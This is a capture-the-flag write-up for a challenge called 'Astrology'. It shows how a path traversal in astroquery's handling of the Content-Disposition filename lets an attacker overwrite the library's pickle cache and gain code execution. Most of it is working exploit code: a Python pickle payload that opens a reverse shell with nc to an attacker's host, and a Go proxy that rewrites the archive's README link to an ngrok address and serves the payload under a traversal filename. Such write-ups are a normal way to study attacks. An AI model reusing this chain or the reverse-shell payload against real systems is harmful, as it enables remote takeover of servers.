# Astrology

We're given a website that allows us to query astronomical observations, and it's source code.

After analyzing the source code, we know that it's using `astropy` to query astronomical data given `ra`, `dec`, `r` and `archive` parameters. Then, it's saving readme files to `downloads` directory.

The `archive` parameter is user-controlled URL to a data archive. Initial idea is to pass attacker's URL which is compatible with Alma. For this reason, I made a simple proxy server in Go.

At first I thought to modify the `app.py` file, but that couldn't be an option, because that would break the challenge for all players.

Let's dig deeper into astropy's source code to find interesting stuff.

`download_files()` method sets the file name from `Content-Disposition` header, not preventing path traversal.

```py
filename = re.search("filename=(.*)", 
    check_filename.headers['Content-Disposition']).groups()[0]
```

When I enabled debug logging by setting `astroquery.log.setLevel('DEBUG')`, I noticed that after files are downloaded, the response is cached as `.pickle` in a writable directory.

```py
def to_cache(response, cache_file):
    log.debug("Caching data to {0}".format(cache_file))

    response = copy.deepcopy(response)
    if hasattr(response, 'request'):
        for key in tuple(response.request.hooks.keys()):
            del response.request.hooks[key]
    with open(cache_file, "wb") as f:
        pickle.dump(response, f, protocol=4)
```

The pickle file name is a hash of request params:
```py
    def hash(self):
        if self._hash is None:
            request_key = (self.method, self.url)
            for k in (self.params, self.data, self.json,
                      self.headers, self.files):
                if isinstance(k, dict):
                    entry = (tuple(sorted(k.items(),
                                          key=_replace_none_iterable)))
                    entry = tuple((k_, v_.read()) if hasattr(v_, 'read')
                                  else (k_, v_) for k_, v_ in entry)
                    for k_, v_ in entry:
                        if hasattr(v_, 'read') and hasattr(v_, 'seek'):
                            v_.seek(0)

                    request_key += entry
                elif isinstance(k, tuple) or isinstance(k, list):
                    request_key += (tuple(sorted(k,
                                                 key=_replace_none_iterable)),)
                elif k is None:
                    request_key += (None,)
                elif isinstance(k, str):
                    request_key += (k,)
                else:
                    raise TypeError("{0} must be a dict, tuple, str, or "
                                    "list".format(k))
            self._hash = hashlib.sha224(pickle.dumps(request_key)).hexdigest()
        return self._hash
```

We can find the hash of our payload file by running the app in docker and checking the logs.

That said, here are the steps required to solve this challenge:
- Create a pickle payload with reverse shell
- Create a proxy server in Go which replaces a single readme URL with attacker-controlled path that leads to the pickle payload
- The proxy server should return the pickle file on `/README.txt` path with filename set as `../../../home/appuser/.astropy/cache/astroquery/Alma/<hash>.pickle`
- Run the same query twice, with `archive` pointing to attacker's proxy server, and `re`, `dec` and `r` all set to `1`

gen-pickle.py:
```py
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('/bin/sh -i 2>&1 | nc ip port > /tmp/f')
        return os.system, (cmd,)


pickled = pickle.dumps(RCE())
with open('pickle', 'wb') as f:
    f.write(pickled)
```

proxy.go:
```go
package main

import (
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"regexp"

	"github.com/icholy/replace"
)

func handleHTTP(w http.ResponseWriter, req *http.Request) {
	body, err := ioutil.ReadAll(req.Body)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	req.Body = ioutil.NopCloser(bytes.NewReader(body))

	fmt.Println(req.RequestURI)

	url := fmt.Sprintf("https://almascience.nrao.edu%s", req.RequestURI)

	proxyReq, err := http.NewRequest(req.Method, url, bytes.NewReader(body))

	proxyReq.Header = make(http.Header)
	for h, val := range req.Header {
		proxyReq.Header[h] = val
	}

	httpClient := http.Client{}
	resp, err := httpClient.Do(proxyReq)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()

	for h, vals := range resp.Header {
		for _, val := range vals {
			if h != "Content-Length" {
				w.Header().Add(h, val)
			}
		}
	}

	myUrl := "https://....ngrok-free.app"

	r := replace.Chain(resp.Body,
		replace.String("https://almascience.nrao.edu/dataPortal/member.uid___A001_X8a5_X51.README.txt", myUrl+"/README.txt"),
		replace.String("https://almascience.nrao.edu", myUrl),
	)

	reg := regexp.MustCompile("[/+]")
	file, err := os.OpenFile("logs/"+reg.ReplaceAllString(req.URL.Path, "_"), os.O_CREATE, 0644)
	if err != nil {
		fmt.Println(err)
		return
	}

	writer := io.MultiWriter(w, file)
	_, err = io.Copy(writer, r)
	if err != nil {
		fmt.Println(err)
	}
}

func handleReadme(w http.ResponseWriter, r *http.Request) {
	w.Header().Add("Content-Disposition", "inline; filename=../../../home/appuser/.astropy/cache/astroquery/Alma/<hash>.pickle")
	w.Header().Add("Content-Type", "text/plain; charset=UTF-8")

    fileBytes, err := ioutil.ReadFile("pickle")
	if err != nil {
		panic(err)
	}

	w.Write(fileBytes)
}

func main() {
	http.HandleFunc("/", handleHTTP)
	http.HandleFunc("/README.txt", handleReadme)
	log.Fatal(http.ListenAndServe(":3333", nil))
}
```